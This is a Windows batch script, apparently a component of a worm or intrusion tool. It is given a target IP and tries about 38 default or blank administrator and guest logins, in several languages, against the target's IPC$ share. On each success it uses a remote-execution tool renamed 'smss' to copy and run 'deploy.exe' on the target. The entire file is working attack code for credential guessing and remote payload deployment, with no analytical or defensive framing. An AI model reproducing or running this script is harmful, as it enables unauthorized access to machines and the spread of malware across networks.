   set ip=%1

    net use \\%ip%\IPC$ "" /user:Administrador
       if not errorlevel 1 goto next1
    net use \\%ip%\IPC$ "administrador" /user:Administrador
       if not errorlevel 1 goto next2
    net use \\%ip%\IPC$ "" /user:Administrator
       if not errorlevel 1 goto next3
    net use \\%ip%\IPC$ "administrator" /user:Administrator
       if not errorlevel 1 goto next4
    net use \\%ip%\IPC$ "" /user:Admin
       if not errorlevel 1 goto next5
    net use \\%ip%\IPC$ "admin" /user:Admin
       if not errorlevel 1 goto next6
    net use \\%ip%\IPC$ "" /user:root
       if not errorlevel 1 goto next7
    net use \\%ip%\IPC$ "root" /user:root
       if not errorlevel 1 goto next8
    net use \\%ip%\IPC$ "" /user:Administrateur
       if not errorlevel 1 goto next9
    net use \\%ip%\IPC$ "administrateur" /user:Administrateur
       if not errorlevel 1 goto next10
    net use \\%ip%\IPC$ "" /user:Administratore
       if not errorlevel 1 goto next11
    net use \\%ip%\IPC$ "administratore" /user:Administratore
       if not errorlevel 1 goto next12
    net use \\%ip%\IPC$ "" /user:Verwalter
       if not errorlevel 1 goto next13
    net use \\%ip%\IPC$ "verwalter" /user:Verwalter
       if not errorlevel 1 goto next14
    net use \\%ip%\IPC$ "" /user:Ospite
       if not errorlevel 1 goto next15
    net use \\%ip%\IPC$ "ospite" /user:Ospite
       if not errorlevel 1 goto next16
    net use \\%ip%\IPC$ "" /user:wwwadmin
       if not errorlevel 1 goto next17
    net use \\%ip%\IPC$ "wwwadmin" /user:wwwadmin
       if not errorlevel 1 goto next18
    net use \\%ip%\IPC$ "" /user:Guest
       if not errorlevel 1 goto next19
    net use \\%ip%\IPC$ "guest" /user:Guest
       if not errorlevel 1 goto next20
    net use \\%ip%\IPC$ "" /user:Convidado
       if not errorlevel 1 goto next21
    net use \\%ip%\IPC$ "convidado" /user:Convidado
       if not errorlevel 1 goto next22
    net use \\%ip%\IPC$ "" /user:server
       if not errorlevel 1 goto next23
    net use \\%ip%\IPC$ "server" /user:server
       if not errorlevel 1 goto next24
    net use \\%ip%\IPC$ "" /user:SERVER
       if not errorlevel 1 goto next25
    net use \\%ip%\IPC$ "SERVER" /user:SERVER
       if not errorlevel 1 goto next26
    net use \\%ip%\IPC$ "" /user:ASPNET
       if not errorlevel 1 goto next27
    net use \\%ip%\IPC$ "ASPNET" /user:ASPNET
       if not errorlevel 1 goto next28
    net use \\%ip%\IPC$ "aspnet" /user:ASPNET
       if not errorlevel 1 goto next29
    net use \\%ip%\IPC$ "" /user:oemcomputer
       if not errorlevel 1 goto next30
    net use \\%ip%\IPC$ "oemcomputer" /user:oemcomputer
       if not errorlevel 1 goto next31
    net use \\%ip%\IPC$ "" /user:OEMCOMPUTER
       if not errorlevel 1 goto next32
    net use \\%ip%\IPC$ "OEMCOMPUTER" /user:OEMCOMPUTER
       if not errorlevel 1 goto next33
    net use \\%ip%\IPC$ "oemcomputer" /user:OEMCOMPUTER
       if not errorlevel 1 goto next34
    net use \\%ip%\IPC$ "" /user:oem
       if not errorlevel 1 goto next35
    net use \\%ip%\IPC$ "oem" /user:oem
       if not errorlevel 1 goto next36
    net use \\%ip%\IPC$ "" /user:Administratör
       if not errorlevel 1 goto next37
    net use \\%ip%\IPC$ "administratör" /user:Administratör
       if not errorlevel 1 goto next38

   goto badping

   :next1
      smss \\%ip% -u Administrador -p "" -f -c -d deploy.exe
    goto badping
   :next2
      smss \\%ip% -u Administrador -p "administrador" -f -c -d deploy.exe
    goto badping
   :next3
      smss \\%ip% -u Administrator -p "" -f -c -d deploy.exe
    goto badping
   :next4
      smss \\%ip% -u Administrator -p "administrator" -f -c -d deploy.exe
    goto badping
   :next5
      smss \\%ip% -u Admin -p "" -f -c -d deploy.exe
    goto badping
   :next6
      smss \\%ip% -u Admin -p "admin" -f -c -d deploy.exe
    goto badping
   :next7
      smss \\%ip% -u root -p "" -f -c -d deploy.exe
    goto badping
   :next8
      smss \\%ip% -u root -p "root" -f -c -d deploy.exe
    goto badping
   :next9
      smss \\%ip% -u Administrateur -p "" -f -c -d deploy.exe
    goto badping
   :next10
      smss \\%ip% -u Administrateur -p "administrateur" -f -c -d deploy.exe
    goto badping
   :next11
      smss \\%ip% -u Administratore -p "" -f -c -d deploy.exe
    goto badping
   :next12
      smss \\%ip% -u Administratore -p "administratore" -f -c -d deploy.exe
    goto badping
   :next13
      smss \\%ip% -u Verwalter -p "" -f -c -d deploy.exe
    goto badping
   :next14
      smss \\%ip% -u Verwalter -p "verwalter" -f -c -d deploy.exe
    goto badping
   :next15
      smss \\%ip% -u Ospite -p "" -f -c -d deploy.exe
    goto badping
   :next16
      smss \\%ip% -u Ospite -p "ospite" -f -c -d deploy.exe
    goto badping
   :next17
      smss \\%ip% -u wwwadmin -p "" -f -c -d deploy.exe
    goto badping
   :next18
      smss \\%ip% -u wwwadmin -p "wwwadmin" -f -c -d deploy.exe
    goto badping
   :next19
      smss \\%ip% -u Guest -p "" -f -c -d deploy.exe
    goto badping
   :next20
      smss \\%ip% -u Guest -p "guest" -f -c -d deploy.exe
    goto badping
   :next21
      smss \\%ip% -u Convidado -p "" -f -c -d deploy.exe
    goto badping
   :next22
      smss \\%ip% -u Convidado -p "convidado" -f -c -d deploy.exe
    goto badping
   :next23
      smss \\%ip% -u server -p "" -f -c -d deploy.exe
    goto badping
   :next24
      smss \\%ip% -u server -p "server" -f -c -d deploy.exe
    goto badping
   :next25
      smss \\%ip% -u SERVER -p "" -f -c -d deploy.exe
    goto badping
   :next26
      smss \\%ip% -u SERVER -p "SERVER" -f -c -d deploy.exe
    goto badping
   :next27
      smss \\%ip% -u ASPNET -p "" -f -c -d deploy.exe
    goto badping
   :next28
      smss \\%ip% -u ASPNET -p "ASPNET" -f -c -d deploy.exe
    goto badping
   :next29
      smss \\%ip% -u ASPNET -p "aspnet" -f -c -d deploy.exe
    goto badping
   :next30
      smss \\%ip% -u oemcomputer -p "" -f -c -d deploy.exe
    goto badping
   :next31
      smss \\%ip% -u oemcomputer -p "oemcomputer" -f -c -d deploy.exe
    goto badping
   :next32
      smss \\%ip% -u OEMCOMPUTER -p "" -f -c -d deploy.exe
    goto badping
   :next33
      smss \\%ip% -u OEMCOMPUTER -p "OEMCOMPUTER" -f -c -d deploy.exe
    goto badping
   :next34
      smss \\%ip% -u OEMCOMPUTER -p "oemcomputer" -f -c -d deploy.exe
    goto badping
   :next35
      smss \\%ip% -u oem -p "" -f -c -d deploy.exe
    goto badping
   :next36
      smss \\%ip% -u oem -p "oem" -f -c -d deploy.exe
    goto badping
   :next37
      smss \\%ip% -u Administratör -p "" -f -c -d deploy.exe
    goto badping
   :next38
      smss \\%ip% -u Administratör -p "administratör" -f -c -d deploy.exe
    goto badping

   :badping
   net use /del \\%ip%\IPC$
